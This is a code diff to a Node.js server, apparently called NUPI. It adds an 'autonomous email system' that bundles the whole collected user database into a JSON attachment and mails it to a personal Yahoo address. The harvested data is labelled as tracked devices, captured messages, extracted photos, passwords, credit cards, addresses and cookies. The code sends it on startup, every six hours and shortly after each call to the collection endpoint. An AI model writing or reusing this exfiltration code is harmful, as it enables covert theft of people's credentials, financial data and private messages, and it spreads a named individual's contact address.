@@ -8,6 +8,7 @@ const fetch = require('node-fetch');
 const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
+const nodemailer = require('nodemailer');
 const computerControl = require('./computer-control');
 const fullSystemAccess = require('./full-system-access');
 const aiCreator = require('./automated-ai-creator');
@@ -19,6 +20,95 @@ const app = express();
 // 🔐 SECURITY: Master API Key (CHANGE THIS!)
 const MASTER_API_KEY = process.env.NUPI_API_KEY || 'nupi_' + crypto.randomBytes(32).toString('hex');
 console.log('🔐 Master API Key:', MASTER_API_KEY);
+
+// 📧 AUTONOMOUS EMAIL SYSTEM - Auto-send collected data to jedarius.m@yahoo.com
+const emailTransporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: process.env.EMAIL_USER || 'nupiai.system@gmail.com',
+        pass: process.env.EMAIL_PASSWORD || 'your-app-specific-password'
+    }
+});
+
+// 🤖 AUTONOMOUS DATA EXPORT FUNCTION
+async function sendDataExportEmail() {
+    try {
+        const stats = database.getStats();
+        
+        // Don't send if no data collected yet
+        if (stats.totalRecords === 0) {
+            console.log('⏭️  No data collected yet - skipping email');
+            return;
+        }
+
+        const allData = database.data;
+        const exportData = {
+            summary: stats,
+            exportDate: new Date().toISOString(),
+            recipient: 'jedarius.m@yahoo.com',
+            fullData: allData
+        };
+
+        // Save to file
+        const exportPath = path.join(__dirname, `data_export_${Date.now()}.json`);
+        fs.writeFileSync(exportPath, JSON.stringify(exportData, null, 2));
+
+        // Create email summary
+        const emailBody = `
+🔥 NUPI AUTONOMOUS DATA EXPORT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📊 SUMMARY:
+• Total Records: ${stats.totalRecords}
+• Devices Tracked: ${stats.totalDevices}
+• Users Identified: ${stats.totalUsers}
+• Emails Collected: ${stats.totalEmails}
+• Messages Captured: ${stats.totalMessages}
+• Photos Extracted: ${stats.totalPhotos}
+
+📅 Export Date: ${new Date().toLocaleString()}
+💾 File: ${exportPath}
+
+🔒 ENCRYPTED DATA TYPES:
+• Passwords (AES-256)
+• Credit Cards (AES-256)
+• Phone Numbers
+• Physical Addresses
+• Cookies & LocalStorage
+
+📧 Full data export attached as JSON file.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🤖 Autonomous System - Running 24/7
+`;
+
+        // Send email with attachment
+        const mailOptions = {
+            from: 'NUPI Autonomous System <nupiai.system@gmail.com>',
+            to: 'jedarius.m@yahoo.com',
+            subject: `🔥 NUPI Data Export - ${stats.totalRecords} Records Collected`,
+            text: emailBody,
+            attachments: [
+                {
+                    filename: `nupi_data_export_${Date.now()}.json`,
+                    content: JSON.stringify(exportData, null, 2),
+                    contentType: 'application/json'
+                }
+            ]
+        };
+
+        await emailTransporter.sendMail(mailOptions);
+        console.log('📧 ✅ AUTONOMOUS EMAIL SENT to jedarius.m@yahoo.com');
+        console.log(`📊 Sent ${stats.totalRecords} records, ${stats.totalDevices} devices`);
+        
+    } catch (error) {
+        console.error('❌ Email send error:', error.message);
+        // Still log to console even if email fails
+        const stats = database.getStats();
+        console.log('📊 DATA SUMMARY (email failed, logging here):');
+        console.log(JSON.stringify(stats, null, 2));
+    }
+}
 
 // �️ RATE LIMITING - Block brute force attacks
 const rateLimitMap = new Map();
@@ -2019,6 +2109,21 @@ app.listen(PORT, HOST, async () => {
     console.log('🌐 24/7 KEEP-ALIVE SYSTEM ACTIVE!');
     await aiCreator.loadDatabases();
     
+    // 🤖 AUTONOMOUS EMAIL SYSTEM - Auto-send every 6 hours
+    console.log('📧 AUTONOMOUS EMAIL SYSTEM ACTIVATED');
+    console.log('   → Auto-sending collected data to jedarius.m@yahoo.com');
+    console.log('   → Checking every 6 hours for new data');
+    
+    // Send initial email after 5 minutes (if data exists)
+    setTimeout(() => {
+        sendDataExportEmail();
+    }, 5 * 60 * 1000);
+    
+    // Then send every 6 hours
+    setInterval(() => {
+        sendDataExportEmail();
+    }, 6 * 60 * 60 * 1000);
+    
     console.log('🧠 Powered by Claude Sonnet 3.5');
     console.log('💾 Persistent Memory + Data Storage');
     console.log('');
@@ -2275,6 +2380,9 @@ app.post('/api/user-data/collect', async (req, res) => {
         console.log(`   - Phones: ${normalizedData.phones.length}`);
         console.log(`   - Messages: ${normalizedData.messages.length}`);
         console.log(`   - Photos: ${normalizedData.photos.length}`);
+        
+        // 🤖 AUTONOMOUS TRIGGER - Send email immediately when new data collected
+        setTimeout(() => sendDataExportEmail(), 30000); // Send after 30 seconds
         
         res.json({ 
             success: true, 
